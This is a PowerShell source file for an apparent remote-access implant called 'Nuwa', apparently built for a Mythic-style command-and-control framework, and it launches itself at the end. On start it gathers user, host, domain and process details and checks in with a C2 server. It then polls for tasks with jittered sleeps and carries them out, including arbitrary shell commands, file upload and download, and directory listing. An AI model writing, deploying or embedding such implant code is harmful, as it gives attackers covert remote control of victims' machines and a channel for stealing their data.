function Write-NuwaDebug {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message
    )

    if ($script:NuwaConfig.DebugLogging) {
        Write-Host "[Status] $Message"
    }
}

function Resolve-NuwaPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ($Path -match '^[A-Za-z]:[\\/]') {
        return $Path
    }

    if ($Path.StartsWith('\\')) {
        return $Path
    }

    Push-Location -LiteralPath $script:NuwaState.CurrentDirectory
    try {
        if (Test-Path -LiteralPath $Path) {
            return (Get-Item -LiteralPath $Path -Force).FullName
        }
        return (Join-Path -Path $script:NuwaState.CurrentDirectory -ChildPath $Path)
    } finally {
        Pop-Location
    }
}

function Get-NuwaCodecContext {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Direction,

        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $true)]
        [string]$MessageType
    )

    return @{
        direction = $Direction
        uuid = $Uuid
        message_type = $MessageType
        c2_profile = [string]$script:NuwaConfig.C2Profile
        codec_profile = $script:NuwaConfig.CodecProfile
        codec_version = '1'
    }
}

function ConvertFrom-NuwaJsonObject {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]$Value
    )

    if ([string]::IsNullOrWhiteSpace($Value)) {
        return $null
    }
    return ($Value | ConvertFrom-Json)
}

function Invoke-NuwaSendMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $true)]
        [string]$Action,

        [Parameter(Mandatory = $false)]
        [hashtable]$Body = @{}
    )

    $message = @{}
    foreach ($key in $Body.Keys) {
        $message[$key] = $Body[$key]
    }
    $message.action = $Action
    $message = Add-NuwaMessageMetadata -Message $message

    $json = $message | ConvertTo-Json -Compress -Depth 20
    $wireBody = ConvertFrom-NuwaUtf8Bytes -Bytes (
        ConvertTo-NuwaWireBytes -MessageJson $json -Context (Get-NuwaCodecContext -Direction 'outbound' -Uuid $Uuid -MessageType $Action)
    )
    Write-NuwaDebug ("Sending action {0} for {1}" -f $Action, $Uuid)
    $rawResponse = Invoke-NuwaTransport -Uuid $Uuid -Action $Action -WireBody $wireBody
    if ([string]::IsNullOrWhiteSpace($rawResponse)) {
        Write-NuwaDebug ("No transport response for action {0} on {1}" -f $Action, $Uuid)
        return $null
    }

    $decodedJson = ConvertFrom-NuwaResponseBody `
        -ResponseBody $rawResponse `
        -ExpectedUuid $Uuid `
        -UuidLength $script:NuwaConfig.MessageUuidLength `
        -Context (Get-NuwaCodecContext -Direction 'inbound' -Uuid $Uuid -MessageType $Action)
    Write-NuwaDebug "Response JSON: $decodedJson"
    return (ConvertFrom-NuwaJsonObject -Value $decodedJson)
}

function Invoke-NuwaUpdateInfo {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [string]$SleepInfo,

        [Parameter(Mandatory = $false)]
        [string]$Cwd
    )

    if ([string]::IsNullOrWhiteSpace($script:NuwaState.CallbackUUID)) {
        return
    }

    $body = @{}
    if (-not [string]::IsNullOrWhiteSpace($SleepInfo)) {
        $body.sleep_info = $SleepInfo
    }
    if (-not [string]::IsNullOrWhiteSpace($Cwd)) {
        $body.cwd = $Cwd
    }
    if ($body.Count -eq 0) {
        return
    }
    [void](Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action 'update_info' -Body $body)
}

function Get-NuwaCheckinMessage {
    [CmdletBinding()]
    param()

    $osValue = if ($env:OS) { [string]$env:OS } else { 'Windows' }
    $architecture = if ($env:PROCESSOR_ARCHITECTURE -match '64') { 'x64' } else { 'x86' }
    return @{
        ip = ''
        os = $osValue
        user = Invoke-NuwaWhoami
        host = Invoke-NuwaHostname
        domain = $env:USERDOMAIN
        pid = $PID
        uuid = $script:NuwaConfig.PayloadUUID
        architecture = $architecture
        cwd = $script:NuwaState.CurrentDirectory
    }
}

function Invoke-NuwaCheckin {
    [CmdletBinding()]
    param()

    $retryDelaySeconds = [int]$script:NuwaConfig.CallbackInterval
    if ($retryDelaySeconds -lt 1) {
        $retryDelaySeconds = 1
    }

    for ($attempt = 1; $attempt -le 3; $attempt += 1) {
        $response = Invoke-NuwaSendMessage -Uuid $script:NuwaConfig.PayloadUUID -Action 'checkin' -Body (Get-NuwaCheckinMessage)
        if ($null -ne $response -and $response.id) {
            $script:NuwaState.CallbackUUID = [string]$response.id
            Write-NuwaDebug "Checked in as $($script:NuwaState.CallbackUUID)"
            return
        }

        Write-NuwaDebug ("Checkin attempt {0}/3 returned no callback id" -f $attempt)
        if ($attempt -lt 3) {
            Start-Sleep -Seconds $retryDelaySeconds
        }
    }

    throw 'Checkin failed after 3 attempts'
}

function ConvertTo-NuwaCommandParameters {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$CommandName,

        [Parameter(Mandatory = $false)]
        [string]$RawParameters
    )

    if ([string]::IsNullOrWhiteSpace($RawParameters)) {
        return @{}
    }

    if ($RawParameters.TrimStart().StartsWith('{')) {
        $parsed = $RawParameters | ConvertFrom-Json
        $result = @{}
        foreach ($property in $parsed.PSObject.Properties) {
            $result[$property.Name] = $property.Value
        }
        return $result
    }

    switch ($CommandName) {
        'shell' { return @{ command = $RawParameters } }
        'download' { return @{ path = $RawParameters } }
        'cd' { return @{ path = $RawParameters } }
        'ls' { return @{ path = $RawParameters } }
        default { return @{} }
    }
}

function Invoke-NuwaTask {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Task
    )

    $parameters = ConvertTo-NuwaCommandParameters -CommandName ([string]$Task.command) -RawParameters ([string]$Task.parameters)
    $response = @{
        task_id = [string]$Task.id
        completed = $true
    }
    $commandName = [string]$Task.command
    Write-NuwaDebug ("Starting task {0} ({1})" -f [string]$Task.id, $commandName)

    try {
        switch ($commandName) {
            'sleep' {
                $sleepInfo = Invoke-NuwaSleep -Parameters $parameters
                $response.user_output = 'Sleep updated'
                Invoke-NuwaUpdateInfo -SleepInfo $sleepInfo
            }
            'cd' {
                $newCwd = Invoke-NuwaCd -Parameters $parameters
                $response.user_output = $newCwd
                Invoke-NuwaUpdateInfo -Cwd $newCwd
            }
            'whoami' {
                $response.user_output = Invoke-NuwaWhoami
            }
            'hostname' {
                $response.user_output = Invoke-NuwaHostname
            }
            'exit' {
                $response.user_output = Invoke-NuwaExit
            }
            'ls' {
                $response.user_output = Invoke-NuwaLs -Parameters $parameters
            }
            'shell' {
                $shellResult = Invoke-NuwaShell -Parameters $parameters
                $response.user_output = $shellResult.user_output
                $response.process_response = $shellResult.process_response
            }
            'upload' {
                $uploadResponse = Invoke-NuwaUpload -TaskId ([string]$Task.id) -Parameters $parameters
                foreach ($key in $uploadResponse.Keys) {
                    $response[$key] = $uploadResponse[$key]
                }
            }
            'download' {
                $response.user_output = Invoke-NuwaDownload -TaskId ([string]$Task.id) -Parameters $parameters
            }
            default {
                throw ("Unsupported command '{0}'" -f $commandName)
            }
        }
    } catch {
        $response.user_output = ($_ | Out-String).TrimEnd()
        $response.status = 'error'
        Write-NuwaDebug ("Task {0} raised {1}" -f [string]$Task.id, ($_ | Out-String).TrimEnd())
    }

    $responseStatus = if (
        $response.ContainsKey('status') -and
        -not [string]::IsNullOrWhiteSpace([string]$response.status)
    ) {
        [string]$response.status
    } else {
        'success'
    }
    Write-NuwaDebug ("Completed task {0} with status {1}" -f [string]$Task.id, $responseStatus)

    return $response
}

function Invoke-NuwaTaskLoop {
    [CmdletBinding()]
    param()

    while (-not $script:NuwaState.ExitRequested) {
        if (Test-NuwaKilldatePassed -Killdate $script:NuwaConfig.Killdate) {
            break
        }

        $tasking = Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action 'get_tasking' -Body @{ tasking_size = -1 }
        if ($tasking -and $tasking.tasks) {
            Write-NuwaDebug ("Received {0} task(s)" -f $tasking.tasks.Count)
            foreach ($task in $tasking.tasks) {
                $response = Invoke-NuwaTask -Task $task
                Write-NuwaDebug ("Sending post_response for task {0}" -f [string]$task.id)
                [void](Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action 'post_response' -Body @{ responses = @($response) })
                if ($script:NuwaState.ExitRequested) {
                    break
                }
            }
        }

        $sleepMilliseconds = [int]((Get-NuwaSleepDurationSeconds -Interval $script:NuwaConfig.CallbackInterval -Jitter $script:NuwaConfig.CallbackJitter) * 1000)
        if ($sleepMilliseconds -lt 0) {
            $sleepMilliseconds = 0
        }
        Start-Sleep -Milliseconds $sleepMilliseconds
    }
}

function Start-Nuwa {
    [CmdletBinding()]
    param()

    $script:NuwaState.CurrentDirectory = (Get-Location).ProviderPath
    Invoke-NuwaCheckin
    Invoke-NuwaTaskLoop
}

Start-Nuwa
